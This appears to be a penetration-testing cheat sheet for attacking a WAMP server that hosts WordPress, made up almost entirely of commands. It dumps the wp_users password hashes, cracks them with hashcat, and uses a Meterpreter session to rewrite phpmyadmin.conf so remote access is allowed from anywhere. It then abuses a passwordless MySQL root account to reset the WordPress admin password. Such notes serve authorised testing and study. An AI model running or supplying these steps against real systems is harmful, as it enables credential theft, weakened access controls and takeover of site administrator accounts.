# WAMP

- Check Web app database for hashed user credentials e.g. WordPress.
```
show databases;
use wordpress;
select * from wp_users;

1 | admin      | $P$BXzMzwqxm65vuHegt/rsJN2VbXPtT.1 | admin         | admin@example.com
```

- Crack hashed credentials.
```
hashcat -m400 -a0 hashes.txt /usr/share/wordlists/rockyou.txt
```

- Modify phpmyadmin.conf to allow remote access.
```
meterpreter > cd C:\\wamp\\alias\\
meterpreter > dir
meterpreter > download C:\\wamp\\alias\\phpmyadmin.conf

Edit ACL:

<Directory "c:/wamp/apps/phpmyadmin3.4.10.1/">
    Options Indexes FollowSymLinks MultiViews
    AllowOverride all
        Order Deny,Allow --> Delete
        Deny from all --> Delete
        Allow from 127.0.0.1 --> Allow from all
</Directory>

meterpreter > upload ~/phpmyadmin.conf
meterpreter > cat phpmyadmin.conf
meterpreter > shell

net stop wampapache
net start wampapache
```

- There is no such thing as a phpMyAdmin user. phpMyAdmin is a front-end for MySQL, so we're talking about MySQL users.
```
http://<ip>:8585/phpmyadmin

Your configuration file contains settings (root with no password) that correspond to the default MySQL privileged account. Your MySQL server is running with this default, is open to intrusion, and you really should fix this security hole by setting a password for user 'root'.
```

- Change WordPress admin password from phpMyAdmin.
```
Click on wordpress.
Click on wp-users.
Edit admin user.
Set user_pass to MD5 (function) and password123 (Value).

Go back to http://<ip>:8585/ and click on wordpress under Your Projects.
Alternatively, http://<ip>:8585/wordpress/wp-admin
Log in with the new password.
```

- Change WordPress admin password with mysql
```
mysql -u root -p -h <ip>
use wordpress;
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
```
